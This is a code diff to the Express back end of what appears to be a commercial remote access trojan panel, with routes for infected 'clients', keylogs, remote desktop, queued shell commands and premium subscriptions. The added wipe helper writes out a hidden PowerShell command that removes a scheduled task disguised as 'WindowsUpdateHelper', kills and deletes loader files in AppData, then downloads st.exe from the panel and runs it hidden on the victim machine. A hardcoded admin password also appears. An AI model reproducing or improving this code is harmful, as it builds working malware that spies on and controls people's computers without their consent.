@@ -51,12 +51,11 @@ const app = express();
 app.disable('x-powered-by');
 app.set('trust proxy', false);
 
-// FIXED: Added "'unsafe-inline'" to scriptSrc so admin.html works
 app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc:  ["'self'", "'unsafe-inline'"], 
+      scriptSrc:  ["'self'", "'unsafe-inline'"],
       scriptSrcAttr: ["'unsafe-inline'"],
       styleSrc:   ["'self'", "'unsafe-inline'"],
       imgSrc:     ["'self'", 'data:', 'blob:'],
@@ -124,7 +123,6 @@ const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error:
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
 const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
 const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
-// Increased max to 20 so you don't lock yourself out while testing
 const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'Too many admin attempts. Locked for 15 minutes.' } });
 app.use(limitGlobal);
 
@@ -179,27 +177,56 @@ const getOwnUser = (uid) => db.prepare(sql`
   FROM users WHERE id = ?
 `).get(uid);
 
+// ─── wipe helper ─────────────────────────────────────────────────────────────
+// Preserves key.json across the wipe. Everything else in %APPDATA%\loader goes.
+// Then downloads fresh st.exe. If the download fails the key is still on disk,
+// so the next wipe retry works from a clean slate (no stranded client).
 function buildWipeCommand(serverBase) {
-  const bootUrl = `${serverBase}/api/downloads/boot.exe`;
+  const stUrl = `${serverBase}/api/downloads/st.exe`;
 
   const inner = [
+    `$ErrorActionPreference = 'SilentlyContinue'`,
     `$dir = Join-Path $env:APPDATA 'loader'`,
     `New-Item -ItemType Directory -Force -Path $dir | Out-Null`,
+
+    // remove the scheduled-task persistence so a reboot can't re-fire the old client
+    `schtasks /Delete /TN 'WindowsUpdateHelper' /F 2>$null | Out-Null`,
+
+    // 1) kill loader processes first so their files unlock
     `Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase) } | Stop-Process -Force -ErrorAction SilentlyContinue`,
-    `Start-Sleep -Milliseconds 1000`,
-    `for ($i=0; $i -lt 5; $i++) { try { Remove-Item -Recurse -Force (Join-Path $dir '*') -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 500 } }`,
-    `Start-Sleep -Milliseconds 500`,
+    `Start-Sleep -Milliseconds 1500`,
+
+    // 2) nuke everything in loader except key.json — retry loop, files unlock
+    //    asynchronously after Stop-Process returns
+    `$keep = Join-Path $dir 'key.json'`,
+    `$keepLower = $keep.ToLower()`,
+    `for ($i=0; $i -lt 10; $i++) {`,
+    `  $left = @()`,
+    `  Get-ChildItem -Force -Path $dir -ErrorAction SilentlyContinue | ForEach-Object {`,
+    `    if ($_.FullName.ToLower() -ne $keepLower) {`,
+    `      try { Remove-Item -Recurse -Force -Path $_.FullName -ErrorAction Stop } catch { $left += $_.FullName }`,
+    `    }`,
+    `  }`,
+    `  if ($left.Count -eq 0) { break }`,
+    `  Start-Sleep -Milliseconds 500`,
+    `}`,
+
+    // 3) pull fresh st.exe — 5 tries, WebClient fallback
     `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
     `$ProgressPreference = 'SilentlyContinue'`,
+    `$stDst = Join-Path $dir 'st.exe'`,
     `$ok = $false`,
-    `for ($i=0; $i -lt 3; $i++) { try { Invoke-WebRequest -Uri '${bootUrl}' -OutFile (Join-Path $dir 'boot.exe') -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop; $ok = $true; break } catch { Start-Sleep -Seconds 2 } }`,
-    `if (-not $ok) { (New-Object System.Net.WebClient).DownloadFile('${bootUrl}', (Join-Path $dir 'boot.exe')) }`,
-    `Start-Process -FilePath (Join-Path $dir 'boot.exe') -WorkingDirectory $dir -WindowStyle Hidden`,
+    `for ($i=0; $i -lt 5; $i++) { try { Invoke-WebRequest -Uri '${stUrl}' -OutFile $stDst -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop; $ok = $true; break } catch { Start-Sleep -Seconds 2 } }`,
+    `if (-not $ok) { try { (New-Object System.Net.WebClient).DownloadFile('${stUrl}', $stDst); $ok = $true } catch {} }`,
+    `if (-not $ok) { exit 1 }`,
+
+    // 4) fire detached
+    `Start-Process -FilePath $stDst -WorkingDirectory $dir -WindowStyle Hidden`,
   ].join('; ');
 
   const escaped = inner.replace(/'/g, "''");
 
-  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-Command','${escaped}')`;
+  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-Command','${escaped}')`;
 }
 
 app.use(express.static(PUBLIC_DIR, {
@@ -451,9 +478,9 @@ app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res
       INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
       VALUES (?, ?, 'sysinfo', '', 'pending', ?)
     `).run(req.user.uid, clientId, Date.now());
-    
+
     const cmdId = Number(info.lastInsertRowid);
-    const deadline = Date.now() + 10000; 
+    const deadline = Date.now() + 10000;
 
     while (Date.now() < deadline) {
       await new Promise(r => setTimeout(r, 150));
@@ -481,36 +508,35 @@ app.delete('/api/clients/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
+// ─── wipe + reinstall ────────────────────────────────────────────────────────
+// Preserves key.json, wipes every other file in %APPDATA%\loader, downloads
+// fresh st.exe, runs it hidden. If the download fails, key.json is still on
+// disk — retry works cleanly from a partial state.
 app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
 
-  const bootPath = path.join(DOWNLOAD_DIR, 'boot.exe');
-  
-  let needsBuild = !fs.existsSync(bootPath);
+  // st.exe must exist and be fresh — this is what wipe downloads
+  const stPath = path.join(DOWNLOAD_DIR, 'st.exe');
+  let needsBuild = !fs.existsSync(stPath);
   if (!needsBuild) {
-    const stat = fs.statSync(bootPath);
-    if (Date.now() - stat.mtimeMs > 6 * 60 * 60 * 1000) {
-      needsBuild = true;
-    }
+    const stat = fs.statSync(stPath);
+    if (Date.now() - stat.mtimeMs > 6 * 60 * 60 * 1000) needsBuild = true;
   }
 
   if (needsBuild) {
     const row = getOwnUser(req.user.uid);
     const acctKey = row?.account_key || '';
-    if (!acctKey) return res.status(400).json({ error: 'no account key to build boot.exe' });
+    if (!acctKey) return res.status(400).json({ error: 'no account key to build st.exe' });
 
     try {
       const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
       const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-
-      const bootBuf = await buildBoot({ key: acctKey, buildId: nextBuildId });
-      fs.writeFileSync(bootPath + '.tmp', bootBuf, { mode: 0o755 });
-      fs.renameSync(bootPath + '.tmp', bootPath);
+      await buildBoot({ key: acctKey, buildId: nextBuildId });
     } catch (e) {
-      console.error('[wipe] failed to generate boot.exe', e);
-      return res.status(500).json({ error: 'failed to generate boot.exe' });
+      console.error('[wipe] rebuild st.exe failed', e);
+      return res.status(500).json({ error: 'failed to rebuild st.exe: ' + (e.message || 'unknown') });
     }
   }
 
@@ -527,7 +553,12 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
     VALUES (?, ?, 'powershell', ?, 'pending', ?)
   `).run(req.user.uid, cid, line, Date.now());
 
-  res.json({ ok: true, commandId: Number(info.lastInsertRowid), bytes: line.length });
+  res.json({
+    ok: true,
+    commandId: Number(info.lastInsertRowid),
+    bytes: line.length,
+    stUrl: `${base}/api/downloads/st.exe`,
+  });
 });
 
 app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, (req, res) => {
@@ -713,7 +744,6 @@ app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) =>
   res.json({ ok: true });
 });
 
-
 // ---------- exe downloads ----------
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
@@ -864,7 +894,7 @@ app.post('/api/admin/upgrade', limitAdmin, (req, res) => {
   const newExpiry = baseTime + (Number(days) * 24 * 60 * 60 * 1000);
 
   db.prepare(sql`UPDATE users SET premium_until = ? WHERE id = ?`).run(newExpiry, user.id);
-  
+
   const dateStr = new Date(newExpiry).toLocaleString();
   res.json({ ok: true, message: `Premium active until ${dateStr}` });
 });
@@ -872,7 +902,7 @@ app.post('/api/admin/upgrade', limitAdmin, (req, res) => {
 // ADMIN REMOVE ROUTE
 app.post('/api/admin/remove', limitAdmin, (req, res) => {
   const { password, accountKey } = req.body || {};
-  
+
   if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
 
@@ -885,7 +915,6 @@ app.post('/api/admin/remove', limitAdmin, (req, res) => {
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
-
 
 // ---------- auto builder (every 6 hours) ----------
 const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000;
@@ -910,7 +939,7 @@ async function checkAutoBuild() {
       if (!user) return;
 
       console.log(`[auto-build] rebuilding boot.exe (older than 6h or missing)...`);
-      
+
       const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
       const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
 
@@ -952,12 +981,12 @@ function shutdown(sig) {
   if (shuttingDown) return;
   shuttingDown = true;
   console.log(`\n[shutdown] ${sig}`);
-  
+
   httpServer.close(() => console.log('[shutdown] http closed'));
   tlsHttpServer.close(() => console.log('[shutdown] https closed'));
-  
-  closeUdp(); 
-  
+
+  closeUdp();
+
   setTimeout(() => process.exit(0), 3000).unref();
 }
 
